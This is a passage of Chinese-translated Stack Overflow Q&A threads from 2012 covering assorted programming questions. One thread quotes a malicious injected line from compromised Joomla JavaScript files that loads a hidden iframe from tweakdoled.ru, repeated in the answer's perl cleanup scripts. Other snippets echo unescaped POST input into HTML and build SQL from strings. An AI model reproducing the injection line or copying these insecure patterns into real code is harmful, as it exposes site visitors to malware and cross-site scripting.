Dim col As New X509Certificate2Collection(EncryptCert)

envData.Decode(data)
envData.Decrypt(col)

Dim decData As Byte() = envData.ContentInfo.Content
message = Encoding.ASCII.GetString(decData) 
```

同样，只要电子邮件未签名，这将非常有效。当电子邮件被签名时，这些额外的字符被添加到附件数据中，我无法正确解码 base64 数据，直到它们被删除。

顺便说一句，在上面的字符串中`?/?z`，`/`字符实际上是一个正方形。该编辑器将其更改为正斜杠。

# javascript - Javascript 邮政编码验证

> ID：13353966
> 
> 赞同：1
> 
> 时间：2012-11-13T00:36:04.753
> 
> 标签：javascript, jquery

好的，我目前正在一个有商店查找器的网站上工作，商店查找器适用于城镇名称和邮政编码，但邮政编码必须在其中有一个空格。例如 'RG1 7UE' 并且没有空格就无法工作 例如 'RG17UE'

所以我在文本框（见下文）上有一些 JS 来调整邮政编码上的间距，效果很好，现在唯一的问题是，如果你在其中输入城镇或城市，JS 会在其中放置一个空格盒子。有谁知道我该如何解决这个问题，以便我可以为城市和邮政编码使用相同的文本输入框？

谢谢，

马丁

```
<input type="text" placeholder="Enter a postcode or town/city..." value="<?php echo $_POST['text'] ?>"  id="address" name="text" class="locator_inputform px192 search-box" onblur="this.value = this.value.replace(/ /g,'').replace( /^(.{2,4})(.{3})(.*)$/, '$1 $2' )"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:56:26.137

仅当输入中有数字时才进行替换。

```
if (/\d/.test(this.value)) {
  this.value = this.value
    .replace(/ /g,'')
    .replace( /^(.{2,4})(.{3})(.*)$/, '$1 $2' );
} 
```

之所以有效，是因为邮政编码总是有一个数字（对吗？），但城市的名字中永远不会有数字。

* * *

但话虽如此，这似乎是一个糟糕的设计。什么样的系统足够灵活，可以通过相同的输入接受邮政编码或城市，但对数据格式有严格的限制？如果它那么严格，它应该接受谨慎输入的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-20T02:09:36.637

对于其他想要这样做的人来说，这很好用！谢谢@AlexWayne

```
<input type="text" placeholder="Insert Postcode or Street Name and/or Town..." value="<?php echo $_POST['text'] ?>"  id="address" name="name" onblur="if (/\d/.test(this.value)) {
this.value = this.value
.replace(/ /g,'')
.replace( /^(.{2,4})(.{3})(.*)$/, '$1 $2' );
}" > 
```

# c# - 基于 LastUpdate 的通知系统

> ID：13353967
> 
> 赞同：0
> 
> 时间：2012-11-13T00:36:10.553
> 
> 标签：c#

在过去的几周里，我的任务是开发一个专门针对我公司需求的票务系统。好吧，没什么大不了的……现在我要谈一个更棘手的话题，我只是无法完全理解。

基于票证最后更新时间的通知系统。

好吧，众所周知，在票务系统中，我们有很多票。我们的每张票都有一个票“状态”，例如“等待客户”、“待发货”等。这些状态具有不同的阈值 IE： 60分钟，120分钟..

基本上我有一个每两个小时运行一次的服务器应用程序。它遍历系统中所有打开的工单，检查它们的工单状态和阈值，如果 LastUpdate 时间超出了我的 60 分钟阈值，那么系统会发出通知，说这张工单没有被处理，有人需要克服它。好的，这意味着系统每运行两个小时就会检查一次时间，如果票证不符合其阈值，则会发出 2 级通知。相同的过程适用于通知 3。

这种情况的问题是，当星期五到来时会发生什么？可能只有 3 张门票需要在周五营业结束前发送通知。然而，当星期一到来并且该系统再次运行时，它将发现每张不合规的票，这意味着我们很可能在人们的邮箱中拥有超过 100 张票。这似乎是任何在日期时间之外运行的通知系统中的常见问题。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:57:16.540

**编辑：现在我知道它是一个 C# 应用程序..**

当您的应用程序决定是否发送通知时..首先，检查是否是周末：

```
if (DateTime.Now.DayOfWeek != DayOfWeek.Saturday && DateTime.Now.DayOfWeek != DayOfWeek.Sunday)
 // start sending notifications. 
```

或者，您可以这样做：

```
if (TimeSpanElapsedToSendNotificationFor(thisItem)) {
    if (isWeekend()) {
        thisItem.LastUpdate.AddDays(2);
        persist(thisItem); // update the DB
        return;
    }
    // send notification here..
} 
```

因此，首先检查是否已经过了所需的通知时间。如果有.. 仔细检查是否是周末.. 如果是.. 将 2 天添加到此项的 LastUpdate 属性，然后退出该功能。如果是工作日，它将继续处理。使用第二种方法，您的第一次检查将在所有工作的第二次运行中为假，除非它们是在周末添加的。

PS：为什么不直接使用定时任务，只在工作时间运行呢？

# html - 我的页眉在移动

> ID：13353972
> 
> 赞同：1
> 
> 时间：2012-11-13T00:37:02.343
> 
> 标签：html, header

我正在尝试在我的页面顶部放置一个标题。它适用于 IE 8。它略微向下移动并在最新的 IE 和苹果 safari 上阻止我的页面内容。谁能告诉我我需要放什么以便它与所有搜索引擎兼容？我是 PHP，包括我所有页面的标题。下面是我的标题代码。

```
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
</head>

<body>

<div style="position: absolute; width: 1280px; height: 92px; z-index: 1; left: 1px; top: 0px" id="layer1">
    <div style="position: absolute; width: 660px; height: 22px; z-index: 1; left: 238px; top: 52px" id="layer2">
        <font face="Arial">|<b>
        <a href="http://www..net/carriers/test3.php">New Cost</a> </b>| <b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        </b>|<b> <a href="http://www..net/carriers/newcarrier.php">New 
        Carrier</a></b> | <b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        </b>|<b> <a href="http://www..net/carriers/search.php">Carrier 
        Board</a></b> | </font></div>
    <p>
    <img border="0" src="/carriers/.png" margin= 0 auto width="100%" height="73"></div>

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:40:28.980

假设这是您正在谈论的标题...

```
<img border="0" src="/carriers/echoheader.png" margin= 0 auto width="100%" height="73"> 
```

...它应该看起来像这样。我认为您需要指定`top`并确定其位置`absolute`。

HTML：

```
<img class='header' /> 
```

CSS：

```
img.header {
   position:absolute;
   top:0;
   ...other styles...
} 
```

尽量避免“内联样式” - 这是您直接在 HTML 中设置元素样式的地方。

将样式与标记分开是一种很好的做法，因为稍后，在更复杂的页面中，您可以更轻松地找到自己的方式。

# python - 从运行 fedora 的系统为我的 python 应用程序创建一个 debian 包

> ID：13353978
> 
> 赞同：1
> 
> 时间：2012-11-13T00:37:27.210
> 
> 标签：python, debian, fedora

我创建了一个小型 python 应用程序，供我的组织内部使用。我在运行 Fedora 17 的主要开发机器上编写了代码，我想创建一个 .deb 以方便我的同事安装我的程序。

是否可以从运行 fedora 的系统为 python 应用程序创建 debian 包？如果是，如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:49:28.137

可以手动完成，但在基于 debian 的发行版上创建它会更快、更轻松（如果您不想安装虚拟机，可以使用虚拟机）

如果您已经在[使用](http://ghantoos.org/2008/10/19/creating-a-deb-package-from-a-python-setuppy/)`install.py`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T22:42:57.793

创建一个 rpm 包，将其提供给您的 Debian 用户，并告诉他们使用 Debian 机器上的外星人将 rpm 转换为 Debian 包。

# security - 会话劫持/MITMA 等是否可以使用 HTTPS？

> ID：13353981
> 
> 赞同：0
> 
> 时间：2012-11-13T00:37:40.270
> 
> 标签：security, ssl, https

使用 HTTPS 时是否可能进行 MITM 之类的攻击？

我知道如果连接以 HTTP 开始然后被重定向到 HTTPS，它们是可能的，但是如果初始连接本身使用 HTTPS 怎么办？

我正在实现一个使用 HTTPS 连接到服务器的客户端，并想知道我是否需要明确确定服务器的真实性（不是，不是验证客户端的服务器就是它所说的身份，而是客户端确保服务器就是它所说的） - 我在 iOS 中这样做，其中有一个 API 可用，这使得它很容易做到，但我不确定是否有必要这样做，如果我这样做，那么如何测试它有用。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:45:26.737

MITM SSL 绝对有可能，如果您实际上不检查服务器的证书，这通常很容易。

考虑有人在咖啡店使用您的应用程序，恶意员工可以控制无线路由器。他们可以监视到您的服务器的 HTTPS 连接并将它们重定向到本地 MITM 程序。例如，该程序使用自签名 SSL 证书接受连接，然后打开与您的真实服务器的连接并代理它们之间的流量。

只要检查服务器证书的有效性，这种简单的攻击就会被挫败。就这样做吧。:-)

已经证明有更复杂的攻击，在特殊情况下，即使您检查证书，MITM 仍然可以建立 SSL 连接，但是使这些攻击起作用的环境足以让大多数开发人员不必担心他们。

# regex - 在 find 命令中转义哪些字符

> ID：13353984
> 
> 赞同：1
> 
> 时间：2012-11-13T00:37:59.390
> 
> 标签：regex, linux, perl

在我的共享主机帐户上我所有 Joomla 安装的所有 js 文件的末尾都注入了以下恶意行：

```
;document.write('<iframe src="http://tweakdoled.ru/confirmingunhelpful.cgi?8" scrolling="auto" frameborder="no" align="center" height="13" width="13"></iframe>'); 
```

我想使用以下 SSH 命令一次从所有文件中删除它（应该有一些错误）：

```
find ./ -name "*.js" -type f | xargs perl -pi -e 's/;document.write\(\'\<iframe src\=\"http\:\/\/tweakdoled.ru\".*\"\);//g' 
```

问题是由于必须使用反斜杠来转义某些字符，我不知道我是否正确使用它以及应该转义什么。

不用说，该命令不起作用。

有任何想法吗？

谢谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:56:20.380

使用 Perl`\Q...\E`表示法暂停元字符。但是，由于要匹配的字符串中有很多字符对于 shell 来说也是特殊的，所以我会将 Perl 正则表达式放入一个文件 ( `script.pl`) 中，使用`%`(它不会出现在要替换的字符串中)作为正则表达式分隔符：

```
s%\Q;document.write('<iframe src="http://tweakdoled.ru/confirmingunhelpful.cgi?8" scrolling="auto" frameborder="no" align="center" height="13" width="13"></iframe>');\E%%g; 
```

然后运行它：

```
find ./ -name "*.js" -type f | xargs perl -pi.bak -f script.pl 
```

如果你花足够的时间，你可能会找到一种方法让它在没有脚本文件的情况下工作；不过，这可能不值得付出努力（尤其是因为我确定您几天前问过与此非常相似的问题）。

显然，在运行它来编辑文件之前，您将运行一个变体以确保打印出所寻求的行：

`script2.pl`：

```
print if m%\Q;document.write('<iframe src="http://tweakdoled.ru/confirmingunhelpful.cgi?8" scrolling="auto" frameborder="no" align="center" height="13" width="13"></iframe>');\E%; 
```

运行使用：

```
find ./ -name "*.js" -type f | xargs perl -n -f script2.pl 
```

如果这没有检测到线条，那么您将追踪一个变化，直到您找到匹配的东西。您可能决定使用类似的东西：

```
print if m%;document.write.'<iframe src="http://tweakdoled.ru/confirmingunhelpful.cgi?8" scrolling="auto" frameborder="no" align="center" height="13" width="13"></iframe>'.;%; 
```

这将两个括号替换为`.`（因此，理论上，它可能匹配其他内容，但实际上不会）。

# java - 基于两个wsdl生成通用webservice java客户端代码

> ID：13353985
> 
> 赞同：2
> 
> 时间：2012-11-13T00:38:01.013
> 
> 标签：java, cxf, webservice-client

我正在尝试使用与我合作的公司提供的 WSDL 文件在 Exchange 2007 和 2010 之间实现一些通用代码。假设大多数情况下 wsdl 在 2007 年和 2010 年之间只有很小的变化。现在，当我基于 wsdl 生成新代码（我使用 cxf-apache）时，我得到了两个单独的包，一个用于 2007 年和 2010 年。这意味着我需要填写代码以不同地使用 2007 和 2010，因为它们的更改略有不同。

我的问题是，有没有更简单的方法来做到这一点？当微软决定发布 Exchange 2013 时，我不想再写 5 个类。

# nsmanagedobjectcontext - 在 AppDelegate 中使用未声明的标识符？

> ID：13353989
> 
> 赞同：1
> 
> 时间：2012-11-13T00:38:37.397
> 
> 标签：nsmanagedobjectcontext

在我的 AppDelegate 实现文件中，我收到一个未声明标识符的错误，但它似乎已声明，我忽略了什么？

```
#import "AppDelegate.h"
#import "ViewController.h"

@implementation AppDelegate

@synthesize window = _window;
@synthesize managedObjectContext=__managedObjectContext;
@synthesize managedObjectModel=__managedObjectModel;
@synthesize persistentStoreCoordinator=__persistentStoreCoordinator;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
// Override point for customization after application launch.
self.viewController = [[ViewController alloc] initWithNibName:@"ViewController" bundle:nil];
self.window.rootViewController = self.viewController;
[self.window makeKeyAndVisible];
return YES;

- (NSManagedObjectContext *)managedObjectContext 
```

错误发生在这一行“使用未声明的标识符“managedObjectContext”

在我的 AppDelegate 头文件中：

```
 #import <UIKit/UIKit.h>
 #import <CoreData/CoreData.h>

 @class ViewController;
 @interface AppDelegate : UIResponder <UIApplicationDelegate>

 @property (strong, nonatomic) UIWindow *window;

 @property (strong, nonatomic) ViewController *viewController;

 @property (nonatomic, retain, readonly) NSManagedObjectContext *managedObjectContext;
 @property (nonatomic, strong) NSManagedObjectModel *managedObjectModel;
 @property (nonatomic, strong) NSPersistentStoreCoordinator *persistentStoreCoordinator;

- (NSURL *)applicationDocumentsDirectory;
- (void)saveContext;

@end 
```

# orchardcms - 将“上次更新”时间戳添加到 Orchard CMS 网站

> ID：13353990
> 
> 赞同：1
> 
> 时间：2012-11-13T00:38:45.410
> 
> 标签：orchardcms

如何在我的 Orchard 网站的页脚添加最后更新的时间戳？也就是说，通过 CMS 管理员对内容进行更改的日期。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T04:30:14.507

您不必添加它，它已经在 Common 部分，如果您想要该项目的最新发布日期，它是发布日期，或者如果您真的想要该项目最后一次有任何修改，它是修改日期. 将此添加到通用部分 (parts.common.metadata.cshtml) 的模板覆盖中：`@Model.ContentPart.PublishedUtc`或`@Model.ContentPart.ModifiedUtc`

# php - 无法选择特定数据

> ID：13353996
> 
> 赞同：-1
> 
> 时间：2012-11-13T00:39:02.383
> 
> 标签：php, mysql

我试图只选择我正在构建的社交网络中的特定数据。登录会话是`$SESSION['user_login']`，它似乎没有选择我需要的行。有人有什么想法吗？

```
 <?php
    if (isset($_GET['u'])) {
    $username = mysql_real_escape_string($_GET['u']);
    if (ctype_alnum($username)) {
         //check user exists
         $check = mysql_query("SELECT username, first_name FROM users WHERE username='$username'");

        if (mysql_num_rows($check)===1) {
            $get       = mysql_fetch_assoc($check);
            $username  = $get['username'];
            $firstname = $get['first_name'];    
        }else{
            echo "<meta http-equiv=\"refresh\" content=\"0; url=index.php\">";  
            exit();
        }
    }
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:58:37.090

正如评论中提到的 mysql_query 已被弃用，并且建议使用更安全的扩展。**选择行**是什么意思。使用您的选择查询，您只会得到 1 行，因为您正在使用唯一的用户名访问登录信息。你的代码是正确的，你得到了一行，但没有办法知道它是否存在于你的结果中。为了调试，您必须将其回显。但是你不会在你的浏览器上得到任何东西，因为你使用的是不返回结果的执行（这就是我所说的）php标签。您将需要使用而不是让您的结果得到回显。

这是你的解决方法-

```
 <?php
    if (isset($_GET['u'])) {
    $username = mysql_real_escape_string($_GET['u']);
    if (ctype_alnum($username)) {
    //check user exists
    $check = mysql_query("SELECT username, first_name FROM users WHERE username='$username'");
    if (mysql_num_rows($check)===1) {
     $get = mysql_fetch_assoc($check);
    $username = $get['username'];
    $firstname = $get['first_name'];    

    echo $username;
    echo $first_name;
   }
  else
  {
   echo "<meta http-equiv=\"refresh\" content=\"0; url=index.php\">";  
   exit();
   }
    }
    } 
```

希望这可以帮助..

丁斯

# ios - 每个 GLKit 立方体面上都有不同的纹理

> ID：13353997
> 
> 赞同：3
> 
> 时间：2012-11-13T00:39:18.390
> 
> 标签：ios, textures, glkit

我正在使用 GL Kit 绘制一个在屏幕上旋转的立方体。在每张脸上绘制相同的纹理时，我的效果非常好。我想在每张脸上画出不同的纹理。

这是当前我的代码绘制立方体的方式（请注意，我实际上在 theTextures 数组中加载了 6 个不同的纹理，但到目前为止，当我更改纹理时，我只绘制相同的立方体的所有边）。

```
self.effect.texture2d0.name = theTextures[i].name;
self.effect.texture2d0.enabled = true;
self.effect.texture2d0.target = GLKTextureTarget2D;

glBindBuffer(GL_ARRAY_BUFFER, _vertexBuffer);
glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, _indexBuffer);

glBindVertexArrayOES(_vertexArray); 

glDrawElements(GL_TRIANGLES, sizeof(Indices)/sizeof(Indices[0]), GL_UNSIGNED_BYTE, 0); 
```

我在stackOverflow上做了很多搜索，看了很多教程，但找不到一个简单的方法来做到这一点。我假设我可以为每个边创建一个顶点数组并为每个顶点数组使用 glDrawElements，但这似乎非常低效。有没有办法让我不必创建 6 个不同的顶点数组来做到这一点？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-02T02:01:58.763

一种相当常见的方法是使用纹理贴图。也就是说，一个纹理包含您需要的所有子纹理。通过这种方式，您不会因大量纹理而使系统过载，但您仍然可以获得所需的所有图形。例如，如果这里只有 4 个纹理，您可能会有一个看起来像这样的图像：

```
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
A A A A A A A A * * * * * * * * x x x x x x x x x . . . . . . . . 
```

（注意：如果纹理的边是 2 的幂（2、4、8、16、32...），则效果最好，尽管它不需要是正方形的！）

然后，当你想使用部分纹理时，只需选择正确的 tx.s/tx.t 坐标即可在该面上获得你想要的图像部分。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-03T07:48:51.400

尽管我仍然分别画出每一面，但我发现以一种有点有效的方式来做这件事。我为每一边创建了一个不同的顶点数组和纹理，但只使用一个索引数组，其中顶点在两个三角形中描述。如果您有任何建议，请通过我的方式发送，

```
// draw one texture per side

for (int i = 0; i <= 5; i++)
{
    glBindBuffer(GL_ARRAY_BUFFER, _vertexBuffer[i]);
    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, _indexBuffer);

    glEnableVertexAttribArray(GLKVertexAttribPosition);
    glVertexAttribPointer(GLKVertexAttribPosition, 3, GL_FLOAT, GL_FALSE, sizeof(Vertex), (const GLvoid *) offsetof(Vertex, Position));
    glEnableVertexAttribArray(GLKVertexAttribColor);
    glVertexAttribPointer(GLKVertexAttribColor, 4, GL_FLOAT, GL_FALSE, sizeof(Vertex), (const GLvoid *) offsetof(Vertex, Color));
    glEnableVertexAttribArray(GLKVertexAttribTexCoord0);
    glVertexAttribPointer(GLKVertexAttribTexCoord0, 2, GL_FLOAT, GL_FALSE, sizeof(Vertex), (const GLvoid *) offsetof(Vertex, TexCoord));

    glActiveTexture(GL_TEXTURE0);
    glBindTexture(GL_TEXTURE_2D, myTexture[i].name);

    glDrawElements(GL_TRIANGLES, sizeof(Indices1)/sizeof(Indices1[0]), GL_UNSIGNED_BYTE, 0);
} 
```

# c++ - 如何以 5 行显示分数？

> ID：13353998
> 
> 赞同：1
> 
> 时间：2012-11-13T00:39:21.067
> 
> 标签：c++, arrays

我对 c++ 编程相当陌生，我需要有关我的程序的帮助。我应该从文本文件中显示一组分数，但我不知道如何以 5 行显示它们。

有什么建议么？

到目前为止，这是我的代码：

```
//Create a Vector to hold a set of exam scores.Write a program to do the following tasks: 1\. Read exam scores into a vector from Scores.txt 
//2\. Display scores in rows of five(5) scores.
//3\. Calculate average score and display.
//4\. Find the median score and display.
//5\. Compute the Standard Deviation and display

#include <vector>
#include <iostream>
#include <fstream>

using namespace std;

int main ()
{   
    const int array_size = 36; // array size
    int numbers[array_size]; //array with 36 elements
    int count = 0;
    ifstream inputfile; //input file into stream object
    //open file
    inputfile.open("Scores.txt");
    //read file
    while (count < array_size && inputfile >> numbers[count])
        count++;
    //close file
    inputfile.close(); 
    //display numbers read
    cout << "Scores:\n";
    for (count = 0; count < array_size; count++)
        cout << numbers[count] << " ";
    cout << endl;

    system ("pause");
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:43:45.433

将您的代码更改为：

```
int column_count = 5;
for (count = 0; count < array_size; count++) {
    cout << numbers[count] << " ";
    if ( count % column_count == column_count - 1 ) {
         cout << "\n";
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T01:29:12.427

您可以使用该功能

```
cout << setw(x); 
```

这将使您打印下一个项目，所以

```
cout << setw(10) << "hello" << "bye now"; 
```

会给你

```
 hellobye now 
```

如果你想左对齐，使用

```
cout << left;
cout << setw(10) << "hello" << "bye now"; 
```

给予

```
hello     bye now 
```

# ruby - 试图在 ruby 程序中创建错误日志。如何在不覆盖数据的情况下写入文件？

> ID：13353999
> 
> 赞同：1
> 
> 时间：2012-11-13T00:39:22.347
> 
> 标签：ruby

尝试将错误日志记录到 Ruby 程序中，这样当我遇到错误时，我可以运行该程序，它会自动将错误写入文本文件。我能够将所有内容写入文件，但每次我在其中输入新错误时都会覆盖文件，并且一次只能保存一个条目。

到目前为止，这是我的代码：

```
print "What is the error message? "
msg = "Error message: " + gets.chomp
print "What does the error mean? "
mean = "Error meaning: "+gets.comp
print "What resolved the error? "
resolved = "Error resolution: " + gets.comp
File.open('Bug_Log.txt', 'w') do |write|
        write.puts msg
        write.puts mean
        write.puts resolved
end 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T00:47:32.700

发生这种情况是因为您以“w”模式打开文件，这会覆盖文件，而不是“a”（“append”）模式，它将追加到文件中已有的内容。

尝试更改此行：

```
File.open('Bug_Log.txt', 'w') do |write| 
```

对此：

```
File.open('Bug_Log.txt', 'a') do |write| 
```